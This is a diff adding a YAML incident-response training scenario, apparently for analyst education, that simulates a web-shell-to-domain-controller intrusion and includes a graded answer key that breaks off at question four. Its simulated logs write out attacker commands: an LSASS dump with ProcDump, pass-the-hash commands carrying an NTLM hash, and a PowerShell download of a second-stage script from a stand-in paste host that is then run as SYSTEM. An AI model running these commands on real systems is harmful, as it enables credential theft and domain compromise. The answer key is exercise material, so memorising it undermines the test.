@@ -1,0 +1,1094 @@
+# ForgeIncident scenario file
+# =============================================================================
+# Modeled on a real senior-analyst interview challenge. This is the most
+# demanding bundled scenario, and it exists to teach three things the other
+# bundled scenarios don't:
+#
+# 1. ENCODED COMMANDS. Web-shell commands ride in a base64 `cmd=` query
+#    parameter. The IIS emitter encodes them, so students must recognize and
+#    decode base64 rather than reading the attack in cleartext.
+#
+# 2. DELIBERATE VISIBILITY GAPS. Two events (`dc-recon-whoami` and
+#    `dc-recon-hostname`) are routed ONLY to the domain controller. They are
+#    the result of web-shell commands delivered by HTTP POST, and IIS never
+#    logs POST bodies — so those commands are genuinely absent from the web
+#    log. A student who only reads WEB01 will under-report the intrusion.
+#    Teaching students to say "more happened than I can see, here is how I
+#    know, here is how to close the gap" is the point.
+#
+# 3. EXFILTRATION AS A DISTINCT EVENT. The LSASS dump is renamed to
+#    `cool_pic.png` and then RETRIEVED over HTTP. Many analysts spot the
+#    dump and the rename but stop before confirming the download — which is
+#    the difference between "credentials were dumped on a host we control"
+#    and "a full credential dump left the network". The answer key grades
+#    that distinction explicitly.
+#
+# The kill chain: unrestricted upload -> web shell -> recon -> LSASS dump via
+# ProcDump -> masquerade + exfil -> pass-the-hash to the DC -> service-install
+# execution (7045) -> second-stage payload from a paste site, run as SYSTEM.
+# =============================================================================
+
+scenario_id: webshell-to-dc-compromise-01
+title: "Web Shell to Domain Controller Compromise"
+
+description: >
+  An externally-facing IIS server at Meridian Freight (WEB01) exposes an
+  unauthenticated file-upload page that does not validate file type. An
+  external actor at 45.144.29.2 discovers it by directory probing, uploads
+  an ASPX web shell disguised as an error page ("forbiden.aspx" — the
+  misspelling is intentional camouflage), and gains code execution as the
+  IIS application pool identity.
+
+  From that shell the actor runs host and domain reconnaissance, uploads
+  ProcDump, and dumps the LSASS process to disk. The dump is renamed to
+  "cool_pic.png" so it looks like ordinary web content, then downloaded over
+  plain HTTP — this is the actual exfiltration, and it means every credential
+  cached on WEB01 must be considered compromised, not just the one the actor
+  went on to use.
+
+  From the dump the actor recovers the NTLM hash for the domain account
+  "eugene", which holds local administrator rights on the domain controller.
+  Using Invoke-WMIExec and then Invoke-SMBExec, they pass that hash to
+  DCSRV. Each SMBExec command lands on the DC as a throwaway Windows service
+  with a random 20-character name (EID 7045) executing via %COMSPEC% — the
+  classic PsExec-style signature. The final service downloads a second-stage
+  PowerShell payload from a paste site and executes it as SYSTEM.
+
+  Two of the DC-side commands were delivered to the web shell by HTTP POST.
+  IIS does not log request bodies, so those two commands appear on the domain
+  controller with no corresponding entry in the web log. This is intentional:
+  the evidence supports the conclusion that the actor's access was broader
+  than the web log alone can prove.
+
+  Impact: SYSTEM-level code execution on a domain controller. The entire
+  domain must be treated as compromised — krbtgt reset and full credential
+  rotation, not merely resetting the single account observed in the logs.
+
+student_briefing: >
+  Meridian Freight's monitoring picked up an alert overnight for anomalous
+  service creation on DCSRV, the company's domain controller. Nobody on the
+  infrastructure team recognizes the service names, and no change request
+  covers that window.
+
+  You have three sources covering 2025-03-09: the IIS access log from WEB01
+  (the public-facing web server), Windows event logs from WEB01 including
+  Sysmon, and Windows event logs from DCSRV.
+
+  Determine what happened. Your report should establish how the intruder
+  first got in, what they did on each host, whether any data left the
+  environment, and what the scope of the compromise is. State clearly what
+  you can prove from the evidence, what you assess as likely, and what you
+  cannot determine from the logs provided.
+
+difficulty: advanced
+version: "1.0"
+seed: 20250309
+
+organization:
+  name: Meridian Freight
+  domain: meridianfreight.example
+  industry: Logistics
+  timezone: UTC
+
+mitre_tactics:
+  - Initial Access
+  - Execution
+  - Persistence
+  - Credential Access
+  - Discovery
+  - Lateral Movement
+  - Collection
+  - Exfiltration
+
+learning_objectives:
+  - Identify an unrestricted file upload as the initial access vector from web logs alone
+  - Recognize and decode base64-encoded commands smuggled through query strings
+  - Spot w3wp.exe spawning cmd.exe as the definitive web-shell execution signature
+  - Distinguish credential dumping from confirmed credential exfiltration
+  - Recognize the 7045 random-service-name pattern as PsExec-style remote execution
+  - Distinguish NTLM pass-the-hash logons from normal Kerberos authentication
+  - Identify and articulate a logging visibility gap rather than under-reporting
+  - Scope a domain controller compromise correctly (whole-domain, not single-account)
+
+tags: [web-shell, iis, pass-the-hash, lsass, exfiltration, domain-compromise, lateral-movement]
+
+start_time: "2025-03-09T06:00:00Z"
+
+actors:
+  attacker:
+    # Never referenced as an `actor:` on web-log events: an IIS log records a
+    # client IP, never an identity. The only attributable identity in this
+    # incident is the domain account whose hash was stolen.
+    username: unknown
+    email: unknown@unknown.external
+    display_name: Unattributed External Actor
+    is_compromised: true
+  iis_pool:
+    username: DefaultAppPool
+    email: apppool@meridianfreight.example
+    display_name: "IIS APPPOOL\\DefaultAppPool"
+    department: Service Account
+    role_title: IIS Application Pool Identity
+  eugene:
+    username: eugene
+    email: eugene@meridianfreight.example
+    display_name: Eugene Marsh
+    department: Infrastructure
+    role_title: Systems Administrator
+    employee_id: MF-1106
+    is_compromised: true
+    is_privileged: true
+
+hosts:
+  web01:
+    hostname: WEB01
+    ip_address: 10.42.10.90
+    host_type: server
+    os: windows
+    os_version: "Windows Server 2019 Standard"
+    domain_joined: true
+  dcsrv:
+    hostname: DCSRV
+    ip_address: 10.42.10.10
+    host_type: domain_controller
+    os: windows
+    os_version: "Windows Server 2019 Datacenter"
+    domain_joined: true
+
+timeline:
+  # ---- Discovery of the upload page -------------------------------------
+  - id: probe-root
+    at: "+0m"
+    event_type: web_request
+    log_sources: [iis]
+    severity: info
+    description: >
+      First contact. The actor requests the default IIS start page from
+      45.144.29.2 using an ordinary Edge user-agent. Note for instructors:
+      the scenario contains no scanner-like user-agents at all. Analysts who
+      hunt for "curl/nikto/sqlmap" will find nothing; this intrusion is only
+      visible through anomalous PATHS, not anomalous agents.
+    mitre:
+      technique_id: T1595
+      technique_name: "Active Scanning"
+      tactic: Reconnaissance
+    http:
+      method: GET
+      uri_stem: /iisstart.png
+      status_code: 200
+      time_taken_ms: 1
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 51022
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: probe-miss
+    at: "+3m7s"
+    event_type: web_request
+    log_sources: [iis]
+    severity: low
+    description: >
+      Path guessing. A 404 for a page that does not exist — the actor is
+      enumerating application paths by hand.
+    http:
+      method: GET
+      uri_stem: /admin.aspx
+      status_code: 404
+      time_taken_ms: 69
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 51044
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: find-uploadsite
+    at: "+5m8s"
+    event_type: web_request
+    log_sources: [iis]
+    severity: medium
+    description: >
+      The actor finds the upload application directory. A 200 here is the
+      pivot point of the entire intrusion.
+    mitre:
+      technique_id: T1083
+      technique_name: "File and Directory Discovery"
+      tactic: Discovery
+    http:
+      method: GET
+      uri_stem: /UploadSite/ok.aspx
+      status_code: 200
+      time_taken_ms: 52
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 51090
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: find-upload-form
+    at: "+6m5s"
+    event_type: web_request
+    log_sources: [iis]
+    severity: medium
+    description: >
+      The unauthenticated upload form itself is retrieved. No credentials
+      were required to reach it — this is the vulnerability.
+    mitre:
+      technique_id: T1190
+      technique_name: "Exploit Public-Facing Application"
+      tactic: Initial Access
+    http:
+      method: GET
+      uri_stem: /UploadSite/upload_picture.aspx
+      status_code: 200
+      time_taken_ms: 8102
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 51120
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  # ---- Web shell upload --------------------------------------------------
+  - id: upload-webshell
+    at: "+6m27s"
+    event_type: web_shell_upload
+    log_sources: [iis]
+    severity: critical
+    description: >
+      The web shell is uploaded. The upload handler performs no file-type
+      validation, so an .aspx file lands inside the web root and is
+      therefore executable by the application. Root cause of the incident.
+    mitre:
+      technique_id: T1505.003
+      technique_name: "Server Software Component: Web Shell"
+      tactic: Persistence
+    http:
+      method: POST
+      uri_stem: /UploadSite/upload_picture.aspx
+      status_code: 200
+      time_taken_ms: 48
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 51140
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: webshell-written
+    at: "+6m31s"
+    event_type: file_created
+    log_sources: [windows]
+    severity: critical
+    actor: iis_pool
+    host: web01
+    description: >
+      Sysmon records w3wp.exe writing the shell to disk. A web server
+      process creating an .aspx file inside its own web root is almost never
+      legitimate and is the single highest-fidelity detection opportunity in
+      this scenario.
+    mitre:
+      technique_id: T1505.003
+      technique_name: "Server Software Component: Web Shell"
+      tactic: Persistence
+    file:
+      path: C:\inetpub\wwwroot\UploadSite\forbiden.aspx
+      filename: forbiden.aspx
+      sha256: "9f2c4e1a7b8d3f6052c9ae41d7b30f8e6a145c92db73e0f81a4c6b25d938e7fa"
+      size_bytes: 1487
+
+  - id: webshell-first-touch
+    at: "+7m6s"
+    event_type: web_request
+    log_sources: [iis]
+    severity: high
+    description: >
+      The actor confirms the shell is live by requesting it with no command
+      parameter. A page named "forbiden.aspx" returning 200 is itself an
+      anomaly — a real forbidden-page would return 403.
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      status_code: 200
+      time_taken_ms: 46
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 51180
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  # ---- Host and domain reconnaissance ------------------------------------
+  - id: recon-whoami
+    at: "+8m49s"
+    event_type: web_shell_command
+    log_sources: [iis, windows]
+    severity: high
+    actor: iis_pool
+    host: web01
+    description: >
+      First command through the shell, base64-encoded in the query string.
+      Establishes the shell runs as the application pool identity.
+    mitre:
+      technique_id: T1033
+      technique_name: "System Owner/User Discovery"
+      tactic: Discovery
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      cmd_plaintext: "whoami"
+      status_code: 200
+      time_taken_ms: 60
+    process:
+      pid: 4180
+      ppid: 3096
+      name: cmd.exe
+      command_line: '"cmd.exe" /c whoami'
+      parent_name: w3wp.exe
+      integrity_level: High
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 51210
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: recon-network
+    at: "+9m38s"
+    event_type: web_shell_command
+    log_sources: [iis, windows]
+    severity: high
+    actor: iis_pool
+    host: web01
+    description: >
+      Network configuration enumeration, revealing the internal subnet and
+      the domain controller's address.
+    mitre:
+      technique_id: T1016
+      technique_name: "System Network Configuration Discovery"
+      tactic: Discovery
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      cmd_plaintext: "ipconfig /all"
+      status_code: 200
+      time_taken_ms: 61
+    process:
+      pid: 4232
+      ppid: 3096
+      name: cmd.exe
+      command_line: '"cmd.exe" /c ipconfig /all'
+      parent_name: w3wp.exe
+      integrity_level: High
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 51244
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: recon-domain
+    at: "+10m44s"
+    event_type: web_shell_command
+    log_sources: [iis, windows]
+    severity: high
+    actor: iis_pool
+    host: web01
+    description: >
+      Domain controller enumeration. The actor now knows which host to
+      target for lateral movement.
+    mitre:
+      technique_id: T1018
+      technique_name: "Remote System Discovery"
+      tactic: Discovery
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      cmd_plaintext: "nltest /dclist:meridianfreight"
+      status_code: 200
+      time_taken_ms: 11259
+    process:
+      pid: 4288
+      ppid: 3096
+      name: cmd.exe
+      command_line: '"cmd.exe" /c nltest /dclist:meridianfreight'
+      parent_name: w3wp.exe
+      integrity_level: High
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 51281
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: recon-privs
+    at: "+1h20m18s"
+    event_type: web_shell_command
+    log_sources: [iis, windows]
+    severity: high
+    actor: iis_pool
+    host: web01
+    description: >
+      After a 70-minute pause the actor returns and checks token privileges,
+      confirming SeImpersonatePrivilege is available to the pool identity.
+    mitre:
+      technique_id: T1033
+      technique_name: "System Owner/User Discovery"
+      tactic: Discovery
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      cmd_plaintext: "whoami /priv"
+      status_code: 200
+      time_taken_ms: 88
+    process:
+      pid: 4402
+      ppid: 3096
+      name: cmd.exe
+      command_line: '"cmd.exe" /c whoami /priv'
+      parent_name: w3wp.exe
+      integrity_level: High
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 52010
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: recon-lsass-pid
+    at: "+1h20m40s"
+    event_type: web_shell_command
+    log_sources: [iis, windows]
+    severity: high
+    actor: iis_pool
+    host: web01
+    description: >
+      Process listing. This is how the actor learns the LSASS process ID
+      (588) used in the ProcDump command shortly afterward — the two events
+      should be correlated by students.
+    mitre:
+      technique_id: T1057
+      technique_name: "Process Discovery"
+      tactic: Discovery
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      cmd_plaintext: "tasklist /v"
+      status_code: 200
+      time_taken_ms: 1475
+    process:
+      pid: 4455
+      ppid: 3096
+      name: cmd.exe
+      command_line: '"cmd.exe" /c tasklist /v'
+      parent_name: w3wp.exe
+      integrity_level: High
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 52044
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  # ---- Tooling upload and credential dumping -----------------------------
+  - id: upload-procdump
+    at: "+1h34m3s"
+    event_type: malware_download
+    log_sources: [iis, windows]
+    severity: critical
+    actor: iis_pool
+    host: web01
+    description: >
+      ProcDump (renamed pd.exe) is uploaded through the same unauthenticated
+      form. Signed Microsoft Sysinternals tooling, so antivirus does not
+      object — living-off-the-land by design.
+    mitre:
+      technique_id: T1105
+      technique_name: "Ingress Tool Transfer"
+      tactic: Command and Control
+    http:
+      method: POST
+      uri_stem: /UploadSite/upload_picture.aspx
+      status_code: 200
+      time_taken_ms: 80
+    file:
+      path: C:\inetpub\wwwroot\uploads\pd.exe
+      filename: pd.exe
+      sha256: "2f5c1b3e7a94d602f8e15c73b0a486d29fc31e5b7480a2c96de35f18b7c4029a"
+      size_bytes: 667816
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 52310
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: lsass-dump
+    at: "+1h56m8s"
+    event_type: credential_harvested
+    log_sources: [iis, windows]
+    severity: critical
+    actor: iis_pool
+    host: web01
+    description: >
+      LSASS memory is dumped to disk with ProcDump against PID 588. Note
+      Sysmon fires its "Sysinternals Tool Used" rule here — a detection that
+      existed and produced telemetry, but evidently generated no response.
+    mitre:
+      technique_id: T1003.001
+      technique_name: "OS Credential Dumping: LSASS Memory"
+      tactic: Credential Access
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      cmd_plaintext: 'C:\inetpub\wwwroot\uploads\pd.exe -accepteula -ma 588 C:\inetpub\wwwroot\uploads\dumpfile.dmp'
+      status_code: 200
+      time_taken_ms: 800
+    process:
+      pid: 4512
+      ppid: 3096
+      name: pd.exe
+      command_line: 'C:\inetpub\wwwroot\uploads\pd.exe -accepteula -ma 588 C:\inetpub\wwwroot\uploads\dumpfile.dmp'
+      parent_name: w3wp.exe
+      sha256: "2f5c1b3e7a94d602f8e15c73b0a486d29fc31e5b7480a2c96de35f18b7c4029a"
+      integrity_level: High
+    file:
+      path: C:\inetpub\wwwroot\uploads\dumpfile.dmp
+      filename: dumpfile.dmp
+      sha256: "c7e42a19b6f3058d1cb94e27a5f60d38e91b47c25d0a0f38b91e64c27a5d0e93"
+      size_bytes: 58720256
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 52501
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: masquerade-dump
+    at: "+2h7m52s"
+    event_type: file_modified
+    log_sources: [iis, windows]
+    severity: high
+    actor: iis_pool
+    host: web01
+    description: >
+      The dump is renamed with a .png extension so it blends into ordinary
+      web content and can be fetched over HTTP without looking unusual.
+      Defense evasion via masquerading.
+    mitre:
+      technique_id: T1036.008
+      technique_name: "Masquerading: Masquerade File Type"
+      tactic: Defense Evasion
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      cmd_plaintext: 'move C:\inetpub\wwwroot\uploads\dumpfile.dmp C:\inetpub\wwwroot\uploads\cool_pic.png'
+      status_code: 200
+      time_taken_ms: 61
+    file:
+      path: C:\inetpub\wwwroot\uploads\cool_pic.png
+      filename: cool_pic.png
+      sha256: "c7e42a19b6f3058d1cb94e27a5f60d38e91b47c25d0a0f38b91e64c27a5d0e93"
+      size_bytes: 58720256
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 52588
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: exfil-dump
+    at: "+2h8m8s"
+    event_type: data_exfiltration
+    log_sources: [iis]
+    severity: critical
+    description: >
+      THE EXFILTRATION. The renamed LSASS dump is downloaded over plain
+      HTTP. 56 MB leaving the network in a single GET, and the long
+      time-taken value reflects the transfer. Many analysts spot the dump
+      and the rename but never confirm the retrieval — this event is what
+      escalates the incident from "credentials dumped locally" to "every
+      credential cached on WEB01 is in the actor's possession", including
+      the machine account and any other sessions present in memory.
+    mitre:
+      technique_id: T1041
+      technique_name: "Exfiltration Over C2 Channel"
+      tactic: Exfiltration
+    http:
+      method: GET
+      uri_stem: /uploads/cool_pic.png
+      status_code: 200
+      time_taken_ms: 125871
+      bytes_sent: 58720256
+    file:
+      path: C:\inetpub\wwwroot\uploads\cool_pic.png
+      filename: cool_pic.png
+      sha256: "c7e42a19b6f3058d1cb94e27a5f60d38e91b47c25d0a0f38b91e64c27a5d0e93"
+      size_bytes: 58720256
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 52604
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+      bytes_received: 58720256
+
+  # ---- Lateral movement tooling ------------------------------------------
+  - id: upload-wmiexec
+    at: "+2h11m55s"
+    event_type: malware_download
+    log_sources: [iis, windows]
+    severity: critical
+    actor: iis_pool
+    host: web01
+    description: >
+      Invoke-WMIExec is uploaded — a PowerShell pass-the-hash utility that
+      authenticates with an NTLM hash rather than a password.
+    mitre:
+      technique_id: T1105
+      technique_name: "Ingress Tool Transfer"
+      tactic: Command and Control
+    http:
+      method: POST
+      uri_stem: /UploadSite/forbiden.aspx
+      status_code: 200
+      time_taken_ms: 4
+    file:
+      path: C:\inetpub\wwwroot\uploads\iwe.ps1
+      filename: iwe.ps1
+      sha256: "5b83f0c14e7a29d6b035f81c47e92a6d180b3f75c2e409ab6d71f38c05e2941b"
+      size_bytes: 41628
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 52700
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: pth-wmiexec
+    at: "+2h40m37s"
+    event_type: lateral_movement
+    log_sources: [iis, windows]
+    severity: critical
+    actor: iis_pool
+    host: web01
+    description: >
+      First pass-the-hash attempt, using the NTLM hash for "eugene"
+      recovered from the LSASS dump. The hash appears in cleartext on the
+      command line — students should extract it as an IOC.
+    mitre:
+      technique_id: T1550.002
+      technique_name: "Use Alternate Authentication Material: Pass the Hash"
+      tactic: Lateral Movement
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      cmd_plaintext: 'powershell -Command "Import-Module ''C:\inetpub\wwwroot\uploads\iwe.ps1''; Invoke-WMIExec -Target 10.42.10.10 -Domain meridianfreight -Username eugene -Hash 847bfb693121775ad21ba7e42d47fd07 -Command ''whoami''"'
+      status_code: 200
+      time_taken_ms: 845
+    process:
+      pid: 4820
+      ppid: 3096
+      name: powershell.exe
+      command_line: 'powershell -Command "Import-Module ''C:\inetpub\wwwroot\uploads\iwe.ps1''; Invoke-WMIExec -Target 10.42.10.10 -Domain meridianfreight -Username eugene -Hash 847bfb693121775ad21ba7e42d47fd07 -Command ''whoami''"'
+      parent_name: w3wp.exe
+      integrity_level: High
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 52802
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: dc-ntlm-logon
+    at: "+2h40m38s"
+    event_type: account_login_success
+    log_sources: [windows]
+    severity: critical
+    actor: eugene
+    host: dcsrv
+    description: >
+      The pass-the-hash lands. An NTLM (NtLmSsp) network logon for "eugene"
+      arrives at the DC from WEB01. In a Kerberos-first Active Directory
+      environment, NTLM authentication FROM A SERVER is strongly anomalous —
+      this is the highest-value detection signature on the domain controller
+      side, and distinguishing it from the surrounding Kerberos traffic is a
+      core objective of this scenario.
+    mitre:
+      technique_id: T1550.002
+      technique_name: "Use Alternate Authentication Material: Pass the Hash"
+      tactic: Lateral Movement
+    extra:
+      authentication_package: NTLM
+      logon_process: NtLmSsp
+      logon_type: 3
+      source_workstation: WEB01
+      source_ip: 10.42.10.90
+
+  # ---- The visibility gap: POST-delivered commands ------------------------
+  - id: dc-recon-whoami
+    at: "+2h49m26s"
+    event_type: service_installed
+    log_sources: [windows]
+    severity: critical
+    actor: eugene
+    host: dcsrv
+    description: >
+      VISIBILITY GAP (1 of 2). A throwaway service executes "whoami" on the
+      domain controller. The command that triggered this was delivered to
+      the web shell by HTTP POST, and IIS does not log request bodies — so
+      there is NO corresponding entry in the web log for this event. A
+      student who reconstructs the intrusion only from WEB01 will miss it
+      entirely and under-report the attacker's activity.
+    mitre:
+      technique_id: T1569.002
+      technique_name: "System Services: Service Execution"
+      tactic: Execution
+    service:
+      service_name: XFBRJVUPQBBNMSAPIGNN
+      image_path: '%COMSPEC% /C "whoami"'
+      start_type: demand start
+      account: LocalSystem
+
+  - id: dc-recon-hostname
+    at: "+2h50m19s"
+    event_type: service_installed
+    log_sources: [windows]
+    severity: critical
+    actor: eugene
+    host: dcsrv
+    description: >
+      VISIBILITY GAP (2 of 2). Same pattern — another POST-delivered command
+      visible only on the DC. The random 20-character uppercase service name
+      is the signature of Invoke-SMBExec / PsExec-style tooling; legitimate
+      software does not name services this way.
+    mitre:
+      technique_id: T1569.002
+      technique_name: "System Services: Service Execution"
+      tactic: Execution
+    service:
+      service_name: JNJGAJKLIAYGOVRWVJEQ
+      image_path: '%COMSPEC% /C "hostname"'
+      start_type: demand start
+      account: LocalSystem
+
+  # ---- SMBExec lateral movement ------------------------------------------
+  - id: upload-smbexec
+    at: "+2h52m27s"
+    event_type: malware_download
+    log_sources: [iis, windows]
+    severity: critical
+    actor: iis_pool
+    host: web01
+    description: >
+      Invoke-SMBExec is uploaded. Unlike WMIExec, SMBExec creates a service
+      on the target for each command — which is why the DC-side evidence
+      changes character from here on.
+    mitre:
+      technique_id: T1105
+      technique_name: "Ingress Tool Transfer"
+      tactic: Command and Control
+    http:
+      method: POST
+      uri_stem: /UploadSite/forbiden.aspx
+      status_code: 200
+      time_taken_ms: 3
+    file:
+      path: C:\inetpub\wwwroot\uploads\ise.ps1
+      filename: ise.ps1
+      sha256: "e0a71c94b2d385f6017ac48e93b2f5d70c81a6394fe2b70d85c19a4f632d087c"
+      size_bytes: 38104
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 53010
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: pth-smbexec-dir
+    at: "+2h53m27s"
+    event_type: lateral_movement
+    log_sources: [iis, windows]
+    severity: critical
+    actor: iis_pool
+    host: web01
+    description: >
+      SMBExec used to list the DC's C: drive. Same hash, same target
+      account — confirming the actor still relies on eugene's credential.
+    mitre:
+      technique_id: T1550.002
+      technique_name: "Use Alternate Authentication Material: Pass the Hash"
+      tactic: Lateral Movement
+    http:
+      method: GET
+      uri_stem: /UploadSite/forbiden.aspx
+      cmd_plaintext: 'powershell -Command ". ''C:\inetpub\wwwroot\uploads\ise.ps1''; Invoke-SMBExec -Target 10.42.10.10 -Domain meridianfreight -Username eugene -Hash 847bfb693121775ad21ba7e42d47fd07 -Command ''dir C:\''"'
+      status_code: 200
+      time_taken_ms: 1622
+    process:
+      pid: 5104
+      ppid: 3096
+      name: powershell.exe
+      command_line: 'powershell -Command ". ''C:\inetpub\wwwroot\uploads\ise.ps1''; Invoke-SMBExec -Target 10.42.10.10 -Domain meridianfreight -Username eugene -Hash 847bfb693121775ad21ba7e42d47fd07 -Command ''dir C:\''"'
+      parent_name: w3wp.exe
+      integrity_level: High
+    network:
+      protocol: tcp
+      src_ip: 45.144.29.2
+      src_port: 53102
+      dst_ip: 10.42.10.90
+      dst_port: 80
+      action: allow
+
+  - id: dc-service-dir
+    at: "+2h53m28s"
+    event_type: service_installed
+    log_sources: [windows]
+    severity: critical
+    actor: eugene
+    host: dcsrv
+    description: >
+      The corresponding service install on the DC, one second after the
+      command left WEB01. Pairing these two events across hosts is the
+      cleanest demonstration of the lateral movement in the whole dataset.
+    mitre:
+      technique_id: T1569.002
+      technique_name: "System Services: Service Execution"
+      tactic: Execution
+    service:
+      service_name: RPAEIKQUFPUNFNVKJSJA
+      image_path: '%COMSPEC% /C "dir C:\"'
+      start_type: demand start
+      account: LocalSystem
+
+  - id: dc-service-mkdir
+    at: "+3h1m7s"
+    event_type: service_installed
+    log_sources: [windows]
+    severity: high
+    actor: eugene
+    host: dcsrv
+    description: >
+      A staging directory is created on the domain controller, preparing a
+      location for the second-stage payload.
+    mitre:
+      technique_id: T1569.002
+      technique_name: "System Services: Service Execution"
+      tactic: Execution
+    service:
+      service_name: HSEUYQJPNJXBVTHFYPSY
+      image_path: '%COMSPEC% /C "mkdir C:\temp"'
+      start_type: demand start
+      account: LocalSystem
+
+  # ---- Second-stage payload ----------------------------------------------
+  - id: dc-download-payload
+    at: "+3h7m52s"
+    event_type: malware_download
+    log_sources: [windows]
+    severity: critical
+    actor: eugene
+    host: dcsrv
+    description: >
+      A service running as LocalSystem downloads a second-stage PowerShell
+      script from a public paste site. Outbound HTTPS from a domain
+      controller to a paste site is, on its own, sufficient grounds to
+      declare an incident.
+    mitre:
+      technique_id: T1105
+      technique_name: "Ingress Tool Transfer"
+      tactic: Command and Control
+    service:
+      service_name: XHQRIOBCLHVONYJKUPSS
+      image_path: '%COMSPEC% /C "PowerShell -ExecutionPolicy Bypass -NoProfile -Command Invoke-WebRequest -Uri https://paste.example/raw/LSiXv2s9 -OutFile C:\temp\e.ps1"'
+      start_type: demand start
+      account: LocalSystem
+    file:
+      path: C:\temp\e.ps1
+      filename: e.ps1
+      sha256: "1d6b90fa47c3e825b0f194ce73a26d5081bf3947ce20a851d63f709b4c2e8035"
+      size_bytes: 9214
+
+  - id: dc-execute-payload
+    at: "+3h9m38s"
+    event_type: malware_execution
+    log_sources: [windows]
+    severity: critical
+    actor: eugene
+    host: dcsrv
+    description: >
+      Final observed action: the second stage executes as SYSTEM on the
+      domain controller via one more throwaway service. Whatever this script
+      did is unknown — the logs end shortly afterward. This is the point at
+      which the entire domain must be considered compromised, and the
+      correct remediation is a krbtgt double-reset plus full credential
+      rotation, not simply disabling the eugene account.
+    mitre:
+      technique_id: T1059.001
+      technique_name: "Command and Scripting Interpreter: PowerShell"
+      tactic: Execution
+    service:
+      service_name: BLJDSNRKEJTNPSDQFOQA
+      image_path: '%COMSPEC% /C "PowerShell -ExecutionPolicy Bypass -NoProfile -File C:\temp\e.ps1"'
+      start_type: demand start
+      account: LocalSystem
+
+  - id: dc-alert
+    at: "+3h24m0s"
+    event_type: alert_triggered
+    log_sources: [windows]
+    severity: critical
+    host: dcsrv
+    description: >
+      Monitoring finally raises an alert on the anomalous service creation
+      pattern — roughly three and a half hours after initial access, and
+      after the domain controller was already compromised. The dwell time
+      between the first web-shell command and this alert is the response
+      metric worth discussing in the debrief.
+    mitre:
+      technique_id: T1569.002
+      technique_name: "System Services: Service Execution"
+      tactic: Execution
+
+answer_key:
+  - id: q1
+    question: "How did the attacker gain initial access, and what specific weakness made it possible?"
+    answer: >
+      Through an unauthenticated, unvalidated file-upload page at
+      /UploadSite/upload_picture.aspx on WEB01. The handler did not restrict
+      file types, so the attacker uploaded an ASPX web shell
+      ("forbiden.aspx") directly into the web root, where IIS would execute
+      it. No credentials and no software vulnerability were required — the
+      application simply accepted an executable file.
+    related_event_ids: [find-upload-form, upload-webshell, webshell-written]
+    hint: "Work backwards from the first request that returned 200 for a path nobody should be requesting."
+    points: 3
+
+  - id: q2
+    question: "What is the single highest-fidelity host-based indicator that a web shell was present, and why?"
+    answer: >
+      w3wp.exe (the IIS worker process) writing an .aspx file into the web
+      root, followed by w3wp.exe spawning cmd.exe. A web server process has
+      essentially no legitimate reason to create executable content in its
+      own content directory or to launch a command interpreter; either alone
+      justifies an investigation.
+    related_event_ids: [webshell-written, recon-whoami]
+    points: 3
+
+  - id: q3
+    question: "How were the attacker's commands transmitted, and what did they have to do to read them?"
+    answer: >
+      As base64-encoded values in a "cmd" query-string parameter on GET
+      requests to forbiden.aspx. Decoding them reveals the reconnaissance
+      sequence (whoami, ipconfig /all, nltest /dclist, whoami /priv,
+      tasklist /v) and later the ProcDump and pass-the-hash commands.
+    related_event_ids: [recon-whoami, recon-domain, lsass-dump]
+    points: 2
+
+  - id: q4
+    question: "Was any data exfiltrated? Justify your answer with specific evidence."
+    answer: >
